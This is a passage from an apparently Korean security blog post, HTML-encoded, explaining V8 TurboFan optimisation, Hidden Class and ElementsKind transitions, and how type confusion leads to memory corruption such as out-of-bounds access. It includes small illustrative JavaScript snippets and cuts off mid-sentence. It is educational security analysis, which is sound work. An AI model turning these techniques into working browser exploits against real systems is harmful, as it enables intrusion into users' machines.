&#xACE0;&#xAE09; JIT &#xCEF4;&#xD30C;&#xC77C;&#xB7EC;&#xC778; <strong>TurboFan</strong>&#xC774; &#xBCF4;&#xB2E4; &#xC815;&#xAD50;&#xD55C; &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xC218;&#xD589;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C;, Hidden Class&#xB098; ElementsKind&#xC640; &#xAC19;&#xC740; &#xB0B4;&#xBD80; &#xAD6C;&#xC870; &#xC815;&#xBCF4;&#xB97C; &#xC801;&#xADF9; &#xD65C;&#xC6A9;&#xD558;&#xC5EC;, <strong>&#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xAC00; &#xACE0;&#xC815;&#xB418;&#xC5B4; &#xC788;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD55C; &#xACE0;&#xC131;&#xB2A5; Native Code&#xB97C; &#xC0DD;&#xC131;</strong>&#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>e.g., obj.x &#xC811;&#xADFC; &#xC2DC;, V8&#xC740; Hidden Class&#xB97C; &#xD1B5;&#xD574; &#x201C;x&#x201D;&#xC758; &#xC624;&#xD504;&#xC14B;&#xC774; +8&#xC784;&#xC744; &#xC54C;&#xACE0; &#xC9C1;&#xC811; &#xD574;&#xB2F9; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xB97C; &#xCC38;&#xC870;&#xD558;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. &#xB9C8;&#xCC2C;&#xAC00;&#xC9C0;&#xB85C;, ElementsKind&#xB97C; &#xD1B5;&#xD574; &#xBC30;&#xC5F4;&#xC758; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC; &#xBC29;&#xC2DD;&#xB3C4; &#xC815;&#xC801; &#xCD5C;&#xC801;&#xD654;&#xB429;&#xB2C8;&#xB2E4;.</p></blockquote></li></ol><hr><p>TurboFan&#xC740; &#xC774; &#xACFC;&#xC815;&#xC5D0;&#xC11C; Inline Caching(IC), Escape Analysis, Loop Unrolling, Function Inlining &#xB4F1; &#xB2E4;&#xC591;&#xD55C; &#xACE0;&#xAE09; &#xCD5C;&#xC801;&#xD654; &#xAE30;&#xBC95;&#xC744; &#xD65C;&#xC6A9;&#xD569;&#xB2C8;&#xB2E4;. &#xC774;&#xB807;&#xAC8C; &#xC0DD;&#xC131;&#xB41C; Native Code&#xB294; &#xB9E4;&#xC6B0; &#xB192;&#xC740; &#xC2E4;&#xD589; &#xC131;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD558;&#xC9C0;&#xB9CC;, &#xB3D9;&#xC2DC;&#xC5D0; &#xAC1D;&#xCCB4;&#xC758; &#xB0B4;&#xBD80; &#xAD6C;&#xC870;&#xC640; &#xD0C0;&#xC785;&#xC5D0; &#xB300;&#xD55C; <strong>&#xAC15;&#xD55C; &#xC815;&#xC801; &#xAC00;&#xC815;</strong>&#xC5D0; &#xC758;&#xC874;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>V8&#xC740; &#xC774;&#xB7EC;&#xD55C; &#xAC00;&#xC815;&#xC744; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xD568;&#xC218;&#xC758; entry point&#xC5D0; &#xB4F1;&#xB85D;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8; &#xACB0;&#xACFC;, &#xC774;&#xD6C4; &#xD568;&#xC218; &#xD638;&#xCD9C; &#xC2DC;&#xC5D0;&#xB294; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130; &#xB2E8;&#xACC4;&#xB97C; &#xAC74;&#xB108;&#xB6F0;&#xACE0; &#xACE7;&#xBC14;&#xB85C; Native Code&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA70;, &#xC2E4;&#xD589; &#xC18D;&#xB3C4;&#xAC00; &#xD68D;&#xAE30;&#xC801;&#xC73C;&#xB85C; &#xD5A5;&#xC0C1;&#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xD558;&#xC9C0;&#xB9CC; &#xC774; &#xCD5C;&#xC801;&#xD654;&#xB294; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC804;&#xC81C;&#xB97C; &#xC804;&#xC81C;&#xB85C; &#xD569;&#xB2C8;&#xB2E4;.</p><blockquote><p>&#x201C;&#xAC1D;&#xCCB4;&#xC758; &#xAD6C;&#xC870;&#xB098; &#xBC30;&#xC5F4;&#xC758; &#xD0C0;&#xC785;&#xC740; &#xB7F0;&#xD0C0;&#xC784; &#xB3D9;&#xC548; &#xBC14;&#xB00C;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;.&#x201D;</p></blockquote><p>&#xBB38;&#xC81C;&#xB294; JavaScript&#xC758; &#xD2B9;&#xC131;&#xC0C1; &#xAC1D;&#xCCB4;&#xB098; &#xBC30;&#xC5F4;&#xC758; &#xAD6C;&#xC870;&#xB294; &#xC5B8;&#xC81C;&#xB4E0;&#xC9C0; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xBCC0;&#xACBD;&#xB420; &#xC218; &#xC788;&#xB2E4;&#xB294; &#xC810;&#xC785;&#xB2C8;&#xB2E4;. &#xC774;&#xB7EC;&#xD55C; &#xBCC0;&#xD654;&#xAC00; &#xAC10;&#xC9C0;&#xB418;&#xBA74;, V8&#xC740; &#xAE30;&#xC874;&#xC758; Native Code&#xB97C; &#xD3D0;&#xAE30;(deoptimize)&#xD558;&#xACE0; &#xB2E4;&#xC2DC; &#xC778;&#xD130;&#xD504;&#xB9AC;&#xD130;&#xB85C; &#xB418;&#xB3CC;&#xC544;&#xAC00;&#xAC70;&#xB098;, &#xC0C8;&#xB86D;&#xAC8C; &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xADF8;&#xB7EC;&#xB098; &#xB9CC;&#xC57D; &#xC774;&#xB7EC;&#xD55C; &#xBCC0;&#xD654;&#xAC00; &#xC81C;&#xB300;&#xB85C; &#xAC10;&#xC9C0;&#xB418;&#xC9C0; &#xC54A;&#xAC70;&#xB098;, &#xACF5;&#xACA9;&#xC790;&#xC5D0; &#xC758;&#xD574; &#xACE0;&#xC758;&#xC801;&#xC73C;&#xB85C; &#xD68C;&#xD53C;&#xB41C;&#xB2E4;&#xBA74;, V8&#xC740; &#xC5EC;&#xC804;&#xD788; &#xC774;&#xC804;&#xC758; &#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xC815;&#xBCF4;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; &#xCD5C;&#xC801;&#xD654; &#xACBD;&#xB85C;&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xADF8; &#xACB0;&#xACFC;, Hidden Class&#xB098; ElementsKind&#xAC00; &#xC774;&#xBBF8; &#xBC14;&#xB00C;&#xC5C8;&#xC74C;&#xC5D0;&#xB3C4; Inline Cache&#xAC00; &#xC774;&#xC804; &#xC815;&#xBCF4;&#xB97C; &#xADF8;&#xB300;&#xB85C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xC0C1;&#xD669;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC73C;&#xBA70;, &#xC774;&#xB294; &#xC798;&#xBABB;&#xB41C; &#xD544;&#xB4DC; &#xC624;&#xD504;&#xC14B; &#xACC4;&#xC0B0;&#xC774;&#xB098; &#xC5C9;&#xB6B1;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xCC38;&#xC870;&#xB85C; &#xC774;&#xC5B4;&#xC9D1;&#xB2C8;&#xB2E4;. &#xACB0;&#xAD6D; &#xC774;&#xB7EC;&#xD55C; &#xB9E5;&#xB77D;&#xC774; <strong>Type Confusion &#xCDE8;&#xC57D;&#xC810;&#xC758; &#xC9C1;&#xC811;&#xC801;&#xC778; &#xC6D0;&#xC778;</strong>&#xC774; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xCC98;&#xB7FC; V8&#xC758; &#xCD5C;&#xC801;&#xD654; &#xD30C;&#xC774;&#xD504;&#xB77C;&#xC778;&#xC740; JavaScript&#xC758; &#xB3D9;&#xC801;&#xC778; &#xD2B9;&#xC131;&#xC744; &#xC815;&#xC801;&#xC778; &#xC2E4;&#xD589; &#xBAA8;&#xB378;&#xB85C; &#xC218;&#xB834;&#xC2DC;&#xD0A4;&#xAE30; &#xC704;&#xD55C; &#xD575;&#xC2EC; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. Hidden Class&#xC640; ElementsKind&#xB294; &#xC774; &#xC815;&#xC801; &#xBAA8;&#xB378;&#xC758; &#xAE30;&#xBC18;&#xC744; &#xC774;&#xB8E8;&#xBA70;, &#xC774;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xC0DD;&#xC131;&#xB41C; Native Code&#xB294; &#xB9E4;&#xC6B0; &#xB192;&#xC740; &#xC131;&#xB2A5;&#xC744; &#xC81C;&#xACF5;&#xD569;&#xB2C8;&#xB2E4;.</p><p><img src="image%206.png" alt="image.png"></p><p>&#xD558;&#xC9C0;&#xB9CC; &#xB3D9;&#xC2DC;&#xC5D0;, &#xC774; &#xC815;&#xC801; &#xAC00;&#xC815;&#xC774; &#xBB34;&#xB108;&#xC9C0;&#xB294; &#xC21C;&#xAC04; &#xCDE8;&#xC57D;&#xC810;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xAE30; &#xB54C;&#xBB38;&#xC5D0;, &#xC131;&#xB2A5;&#xACFC; &#xBCF4;&#xC548; &#xC0AC;&#xC774;&#xC758; &#xD2B8;&#xB808;&#xC774;&#xB4DC;&#xC624;&#xD504;&#xB97C; &#xAD00;&#xB9AC;&#xD558;&#xB294; &#xAC83;&#xC774; V8 &#xC124;&#xACC4;&#xC5D0;&#xC11C; &#xB9E4;&#xC6B0; &#xC911;&#xC694;&#xD55C; &#xACFC;&#xC81C;&#xAC00; &#xB429;&#xB2C8;&#xB2E4;.</p><h3 id="2-5-Type-Confusion&#xC758;-&#xBC1C;&#xC0DD;-&#xAD6C;&#xC870;"><a href="#2-5-Type-Confusion&#xC758;-&#xBC1C;&#xC0DD;-&#xAD6C;&#xC870;" class="headerlink" title="2.5 Type Confusion&#xC758; &#xBC1C;&#xC0DD; &#xAD6C;&#xC870;"></a>2.5 Type Confusion&#xC758; &#xBC1C;&#xC0DD; &#xAD6C;&#xC870;</h3><p>&#xC55E;&#xC11C; &#xC124;&#xBA85;&#xD55C; V8&#xC758; &#xCD5C;&#xC801;&#xD654; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC740; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xC640; &#xBC30;&#xC5F4;&#xC758; &#xD0C0;&#xC785;&#xC774; &#xBCC0;&#xD558;&#xC9C0; &#xC54A;&#xC744; &#xAC83;&#xC774;&#xB77C;&#xB294; &#xAC15;&#xD55C; &#xC804;&#xC81C;&#xC5D0; &#xAE30;&#xBC18;&#xD569;&#xB2C8;&#xB2E4;. &#xD558;&#xC9C0;&#xB9CC; JavaScript&#xB294; &#xBCF8;&#xC9C8;&#xC801;&#xC73C;&#xB85C; &#xB9E4;&#xC6B0; &#xB3D9;&#xC801;&#xC778; &#xC5B8;&#xC5B4;&#xC774;&#xBA70;, &#xC774; &#xC804;&#xC81C;&#xAC00; &#xC2E4;&#xC81C; &#xC2E4;&#xD589; &#xD750;&#xB984;&#xC5D0;&#xC11C; &#xAE68;&#xC9C0;&#xB294; &#xC21C;&#xAC04; Type Confusion&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC815;&#xC801; &#xBAA8;&#xB378;&#xC758; &#xAE30;&#xBC18;&#xC744; &#xC774;&#xB8E8;&#xB294; Hidden Class&#xC640; ElementsKind&#xC5D0;&#xC11C; &#xAC01;&#xAC01; &#xC5B4;&#xB5A4; &#xC2DD;&#xC73C;&#xB85C; Type Confusion&#xC774; &#xC720;&#xBC1C;&#xB418;&#xB294;&#xC9C0; &#xAD6C;&#xCCB4;&#xC801;&#xC73C;&#xB85C; &#xC0B4;&#xD3B4;&#xBD05;&#xC2DC;&#xB2E4;!</p><hr><p><strong>1) Hidden Class &#xAE30;&#xBC18; Confusion</strong></p><p>Hidden Class&#xB294; &#xAC1D;&#xCCB4;&#xC758; &#xC18D;&#xC131; &#xAD6C;&#xC870;&#xB97C; &#xCD94;&#xC801;&#xD558;&#xC5EC; &#xBE60;&#xB978; &#xD504;&#xB85C;&#xD37C;&#xD2F0; &#xC811;&#xADFC;&#xACFC; JIT &#xCD5C;&#xC801;&#xD654;&#xB97C; &#xAC00;&#xB2A5;&#xD558;&#xAC8C; &#xD574;&#xC8FC;&#xB294; &#xB0B4;&#xBD80; &#xBA54;&#xCEE4;&#xB2C8;&#xC998;&#xC785;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xAC1D;&#xCCB4;&#xC5D0; &#xB3D9;&#xC801;&#xC73C;&#xB85C; &#xC18D;&#xC131;&#xC774; &#xCD94;&#xAC00;&#xB418;&#xAC70;&#xB098;, &#xC18D;&#xC131; &#xD0C0;&#xC785;&#xC774; &#xBC14;&#xB00C;&#xB294; &#xACBD;&#xC6B0;, Hidden Class&#xB294; &#xB2E4;&#xB978; &#xD074;&#xB798;&#xC2A4;&#xB85C; &#xC804;&#xC774;&#xB418;&#xBA70;, &#xC774;&#xB85C; &#xC778;&#xD574; &#xAE30;&#xC874;&#xC758; Native Code&#xB294; &#xB354; &#xC774;&#xC0C1; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">Foo</span>(<span class="hljs-params"></span>) </span>{  <span class="hljs-built_in">this</span>.x = <span class="hljs-number">1</span>;  <span class="hljs-comment">// HiddenClass A</span>  <span class="hljs-built_in">this</span>.y = <span class="hljs-number">2</span>;  <span class="hljs-comment">// HiddenClass B</span>}<span class="hljs-keyword">let</span> a = <span class="hljs-keyword">new</span> Foo();a.z = <span class="hljs-number">3</span>;       <span class="hljs-comment">// HiddenClass C (transition)</span></code></pre><p>&#xC774; &#xACBD;&#xC6B0; <code>a</code>&#xB294; &#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; Hidden Class C&#xB97C; &#xAC16;&#xC2B5;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7F0;&#xB370; TurboFan&#xC774; Hidden Class B&#xAE4C;&#xC9C0;&#xC758; &#xAD6C;&#xC870;&#xB97C; &#xAE30;&#xBC18;&#xC73C;&#xB85C; Native Code&#xB97C; &#xC0DD;&#xC131;&#xD588;&#xACE0;, &#xC774;&#xD6C4;&#xC5D0;&#xB3C4; &#xD574;&#xB2F9; &#xCF54;&#xB4DC;&#xAC00; &#xADF8;&#xB300;&#xB85C; <code>a</code>&#xC5D0; &#xC801;&#xC6A9;&#xB41C;&#xB2E4;&#xBA74;, <code>a.z</code>&#xB97C; <code>a.y</code>&#xB85C; &#xC798;&#xBABB; &#xC778;&#xC2DD;&#xD558;&#xAC70;&#xB098; &#xC798;&#xBABB;&#xB41C; &#xC624;&#xD504;&#xC14B;&#xC744; &#xCC38;&#xC870;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>Hidden Class &#xC804;&#xC774;&#xC640; Deoptimization</strong></p><p>&#xC18D;&#xC131;&#xC758; <strong>&#xD0C0;&#xC785; &#xBCC0;&#xD654;</strong> &#xB610;&#xD55C; Hidden Class &#xC804;&#xC774;&#xB97C; &#xC720;&#xBC1C;&#xD569;&#xB2C8;&#xB2E4;. &#xC608;&#xB97C; &#xB4E4;&#xC5B4;, &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC774; &#xAC1D;&#xCCB4; &#xC18D;&#xC131;&#xC758; &#xD0C0;&#xC785;&#xC774; &#xC22B;&#xC790;&#xC5D0;&#xC11C; &#xAC1D;&#xCCB4;&#xB85C; &#xBC14;&#xB00C;&#xB294; &#xACBD;&#xC6B0;&#xB97C; &#xC0DD;&#xAC01;&#xD574; &#xBD05;&#xC2DC;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-keyword">let</span> obj = { <span class="hljs-attr">x</span>: <span class="hljs-number">1</span> };         <span class="hljs-comment">// x is number &#x2192; HiddenClass A</span>obj.x = { <span class="hljs-attr">nested</span>: <span class="hljs-literal">true</span> };   <span class="hljs-comment">// x is now object &#x2192; HiddenClass B</span></code></pre><p>&#xC774;&#xB54C; V8&#xC740; &#xD0C0;&#xC785; &#xBCC0;&#xACBD;&#xC744; &#xAC10;&#xC9C0;&#xD558;&#xACE0; &#xAE30;&#xC874; Native Code&#xB97C; deoptimize &#xD55C; &#xB4A4;, &#xB2E4;&#xC2DC; &#xBC14;&#xC774;&#xD2B8;&#xCF54;&#xB4DC;&#xB85C; &#xB3CC;&#xC544;&#xAC00;&#xAC70;&#xB098; &#xC0C8;&#xB85C;&#xC6B4; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xAD6C;&#xC870; &#xBCC0;&#xACBD;&#xC774; &#xC801;&#xC808;&#xD788; &#xAC10;&#xC9C0;&#xB418;&#xC9C0; &#xC54A;&#xAC70;&#xB098;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xC6B0;&#xD68C;&#xD558;&#xB3C4;&#xB85D; &#xC785;&#xB825;&#xC744; &#xC124;&#xACC4;&#xD55C; &#xACBD;&#xC6B0;, V8&#xC740; &#xC5EC;&#xC804;&#xD788; &#xAE30;&#xC874; Hidden Class &#xAE30;&#xBC18;&#xC758; Native Code&#xB97C; &#xC2E4;&#xD589;&#xD558;&#xBA74;&#xC11C; &#xC798;&#xBABB;&#xB41C; &#xBA54;&#xBAA8;&#xB9AC; &#xC811;&#xADFC;&#xC774; &#xBC1C;&#xC0DD;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><strong>2) ElementsKind &#xAE30;&#xBC18; Confusion</strong></p><p>&#xBC30;&#xC5F4;&#xC758; &#xACBD;&#xC6B0;, V8&#xC740; &#xC694;&#xC18C;&#xB4E4;&#xC758; &#xD0C0;&#xC785;&#xACFC; &#xBC00;&#xB3C4;&#xC5D0; &#xB530;&#xB77C; &#xB2E4;&#xC591;&#xD55C; <strong>ElementsKind</strong>&#xB97C; &#xC815;&#xC758;&#xD569;&#xB2C8;&#xB2E4;. </p><p>&#xC608;&#xB97C; &#xB4E4;&#xBA74;,</p><ul><li><code>PACKED_SMI_ELEMENTS</code>: &#xC815;&#xC218;&#xB9CC; &#xD3EC;&#xD568;&#xB41C; &#xBC00;&#xC9D1; &#xBC30;&#xC5F4;</li><li><code>PACKED_DOUBLE_ELEMENTS</code>: &#xBD80;&#xB3D9;&#xC18C;&#xC218;&#xC810;&#xB9CC; &#xD3EC;&#xD568;&#xB41C; &#xBC30;&#xC5F4;</li><li><code>PACKED_ELEMENTS</code>: &#xC5EC;&#xB7EC; &#xD0C0;&#xC785;&#xC774; &#xC11E;&#xC778; &#xBC30;&#xC5F4;</li><li>&#xC704;&#xC758; &#xAC01; &#xC885;&#xB958;&#xC5D0; &#xB300;&#xC751;&#xD558;&#xB294; HOLEY_* (&#xD76C;&#xC18C; &#xBC30;&#xC5F4;) &#xBCC0;&#xD615;</li></ul><p>TurboFan&#xC740; &#xBC30;&#xC5F4;&#xC758; ElementsKind&#xAC00; &#xBCC0;&#xD558;&#xC9C0; &#xC54A;&#xB294;&#xB2E4;&#xACE0; &#xAC00;&#xC815;&#xD558;&#xACE0; &#xCD5C;&#xC801;&#xD654; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; &#xBC30;&#xC5F4;&#xC5D0; &#xB2E4;&#xB978; &#xD0C0;&#xC785;&#xC758; &#xC694;&#xC18C;&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xB294; &#xC21C;&#xAC04;, ElementsKind&#xB294; &#xC804;&#xD658;&#xB418;&#xACE0;, &#xAE30;&#xC874; Native Code&#xB294; &#xB354; &#xC774;&#xC0C1; &#xC720;&#xD6A8;&#xD558;&#xC9C0; &#xC54A;&#xC2B5;&#xB2C8;&#xB2E4;.</p><pre><code class="hljs jsx"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">confuse</span>(<span class="hljs-params">x</span>) </span>{  <span class="hljs-keyword">let</span> arr = [<span class="hljs-number">1.1</span>];     <span class="hljs-comment">// PackedDoubleElements</span>  <span class="hljs-keyword">if</span> (x) arr[<span class="hljs-number">0</span>] = {};  <span class="hljs-comment">// object &#xC0BD;&#xC785; &#x2192; ElementsKind &#xC804;&#xD658;</span>  <span class="hljs-keyword">return</span> arr[<span class="hljs-number">0</span>];}</code></pre><p><code>x</code>&#xAC00; <code>false</code>&#xC77C; &#xACBD;&#xC6B0;, <code>arr</code>&#xC740; double &#xBC30;&#xC5F4;&#xB85C; &#xC720;&#xC9C0;&#xB418;&#xBA70; TurboFan&#xC740; &#xC774;&#xC5D0; &#xB9DE;&#xB294; &#xCF54;&#xB4DC;&#xB97C; &#xC0DD;&#xC131;&#xD569;&#xB2C8;&#xB2E4;. &#xADF8;&#xB7EC;&#xB098; <code>x</code>&#xAC00; <code>true</code>&#xC774;&#xBA74; <code>arr[0]</code>&#xC5D0; &#xAC1D;&#xCCB4;&#xAC00; &#xC0BD;&#xC785;&#xB418;&#xBA74;&#xC11C; &#xBC30;&#xC5F4;&#xC758; &#xB0B4;&#xBD80; &#xD45C;&#xD604;&#xC774; &#xBC14;&#xB01D;&#xB2C8;&#xB2E4;. &#xC774;&#xB54C; &#xC5EC;&#xC804;&#xD788; &#xAE30;&#xC874; Native Code&#xAC00; &#xC2E4;&#xD589;&#xB418;&#xBA74;, &#xAC1D;&#xCCB4;&#xB97C; double&#xB85C; &#xD574;&#xC11D;&#xD558;&#xB294; <strong>&#xC798;&#xBABB;&#xB41C; &#xD0C0;&#xC785; &#xCE90;&#xC2A4;&#xD305;</strong>&#xC774; &#xBC1C;&#xC0DD;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><h2 id="3-From-Type-Confusion-to-Memory-Corruption"><a href="#3-From-Type-Confusion-to-Memory-Corruption" class="headerlink" title="3. From Type Confusion to Memory Corruption"></a>3. From Type Confusion to Memory Corruption</h2><h3 id="3-1-&#xC2E4;&#xC9C8;&#xC801;&#xC778;-Memory-Corruption&#xC73C;&#xB85C;&#xC758;-&#xC5F0;&#xACB0;"><a href="#3-1-&#xC2E4;&#xC9C8;&#xC801;&#xC778;-Memory-Corruption&#xC73C;&#xB85C;&#xC758;-&#xC5F0;&#xACB0;" class="headerlink" title="3.1 &#xC2E4;&#xC9C8;&#xC801;&#xC778; Memory Corruption&#xC73C;&#xB85C;&#xC758; &#xC5F0;&#xACB0;"></a>3.1 &#xC2E4;&#xC9C8;&#xC801;&#xC778; Memory Corruption&#xC73C;&#xB85C;&#xC758; &#xC5F0;&#xACB0;</h3><p>&#xB2E8;&#xC21C;&#xD55C; Type Confusion&#xC740; &#xC65C; Memory Corruption&#xC73C;&#xB85C; &#xD655;&#xC7A5;&#xB420;&#xAE4C;&#xC694;?</p><p>&#xADF8; &#xD575;&#xC2EC;&#xC740;, V8&#xC758; JIT &#xCD5C;&#xC801;&#xD654;&#xB41C; &#xB124;&#xC774;&#xD2F0;&#xBE0C; &#xCF54;&#xB4DC;&#xAC00; &#xAC1D;&#xCCB4; &#xAD6C;&#xC870;&#xB098; &#xBC30;&#xC5F4;&#xC758; &#xD0C0;&#xC785;&#xC744; &#xC2E0;&#xB8B0;&#xD55C; &#xCC44;, &#xBA54;&#xBAA8;&#xB9AC;&#xC5D0; &#xC9C1;&#xC811; &#xC811;&#xADFC;&#xD55C;&#xB2E4;&#xB294; &#xB370; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;. V8&#xC740; HiddenClass(Map)&#xB098; ElementsKind &#xC815;&#xBCF4;&#xB97C; &#xBC14;&#xD0D5;&#xC73C;&#xB85C; &#xAC1D;&#xCCB4; &#xB610;&#xB294; &#xBC30;&#xC5F4;&#xC758; &#xC815;&#xD655;&#xD55C; &#xD544;&#xB4DC; &#xC624;&#xD504;&#xC14B;&#xC744; &#xACC4;&#xC0B0;&#xD558;&#xC5EC; &#xBE60;&#xB974;&#xAC8C; &#xC811;&#xADFC;&#xD569;&#xB2C8;&#xB2E4;. &#xBB38;&#xC81C;&#xB294; &#xC774; &#xAC00;&#xC815;&#xC774; &#xAE68;&#xC9C0;&#xB294; &#xACBD;&#xC6B0;&#xC785;&#xB2C8;&#xB2E4;. &#xAC1D;&#xCCB4;&#xC758; &#xC2E4;&#xC81C; &#xAD6C;&#xC870;&#xAC00; &#xBCC0;&#xACBD;&#xB418;&#xC5C8;&#xB294;&#xB370;&#xB3C4; &#xCEF4;&#xD30C;&#xC77C;&#xB41C; &#xCF54;&#xB4DC;&#xB294; &#xC5EC;&#xC804;&#xD788; &#xC774;&#xC804; &#xAD6C;&#xC870;&#xB97C; &#xAE30;&#xC900;&#xC73C;&#xB85C; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB418;&#xBA74;, &#xC644;&#xC804;&#xD788; &#xC5C9;&#xB6B1;&#xD55C; &#xBA54;&#xBAA8;&#xB9AC; &#xC8FC;&#xC18C;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130;&#xB97C; &#xC798;&#xBABB; &#xD574;&#xC11D;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; &#xACE7; &#xC608;&#xAE30;&#xCE58; &#xC54A;&#xC740; &#xC704;&#xCE58;&#xC758; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC870;&#xC791;&#xD558;&#xAC8C; &#xB418;&#xB294; &#xBA54;&#xBAA8;&#xB9AC; &#xCEE4;&#xB7FD;&#xC158;&#xC73C;&#xB85C; &#xC774;&#xC5B4;&#xC9C8; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p>&#xC608;&#xB97C; &#xB4E4;&#xBA74; &#xB2E4;&#xC74C;&#xACFC; &#xAC19;&#xC740; &#xC0C1;&#xD669;&#xC744; &#xC0DD;&#xAC01;&#xD574;&#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><ul><li><p><strong>&#xBD80;&#xB3D9;&#xC18C;&#xC218;&#xC810; &#xBC30;&#xC5F4;&#xC744; &#xAC1D;&#xCCB4; &#xBC30;&#xC5F4;&#xB85C; &#xC624;&#xC778;&#xD55C; &#xACBD;&#xC6B0;</strong></p><p>  <code>13.37</code>&#xACFC; &#xAC19;&#xC740; &#xBD80;&#xB3D9;&#xC18C;&#xC218;&#xC810; &#xAC12;&#xC774; &#xC800;&#xC7A5;&#xB41C; &#xBC30;&#xC5F4;&#xC744;, JIT&#xAC00; &#xAC1D;&#xCCB4; &#xBC30;&#xC5F4;&#xB85C; &#xC798;&#xBABB; &#xD310;&#xB2E8;&#xD558;&#xACE0; &#xC811;&#xADFC;&#xD560; &#xACBD;&#xC6B0;, &#xC774; &#xC22B;&#xC790; &#xAC12;&#xC774; &#xB9C8;&#xCE58; &#xD799; &#xD3EC;&#xC778;&#xD130;&#xC778; &#xAC83;&#xCC98;&#xB7FC; &#xD574;&#xC11D;&#xB418;&#xC5B4; &#xC804;&#xD600; &#xC758;&#xB3C4;&#xD558;&#xC9C0; &#xC54A;&#xC740; &#xBA54;&#xBAA8;&#xB9AC; &#xC704;&#xCE58;&#xC5D0; &#xC811;&#xADFC;&#xD558;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;. &#xC774;&#xB294; OOB Read/Write&#xB85C; &#xC774;&#xC5B4;&#xC9C0;&#xBA70;, &#xACF5;&#xACA9;&#xC790;&#xAC00; &#xC774;&#xB97C; &#xD1B5;&#xD574; &#xC778;&#xC811;&#xD55C; &#xAC1D;&#xCCB4;&#xB97C; &#xC870;&#xC791;&#xD558;&#xAC70;&#xB098; &#xB370;&#xC774;&#xD130; &#xC720;&#xCD9C;&#xC744; &#xC720;&#xB3C4;&#xD560; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p></li><li><p><strong>TypedArray &#xB610;&#xB294; DataView&#xB97C; &#xC774;&#xC6A9;&#xD55C; &#xD3EC;&#xC778;&#xD130; &#xC870;&#xC791;</strong></p><p>  &#xC790;&#xBC14;&#xC2A4;&#xD06C;&#xB9BD;&#xD2B8;&#xC5D0;&#xC11C; TypedArray&#xB098; ArrayBuffer&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xB294; &#xACBD;&#xC6B0;, &#xD574;&#xB2F9; &#xBC84;&#xD37C;&#xAC00; &#xC2E4;&#xC81C; 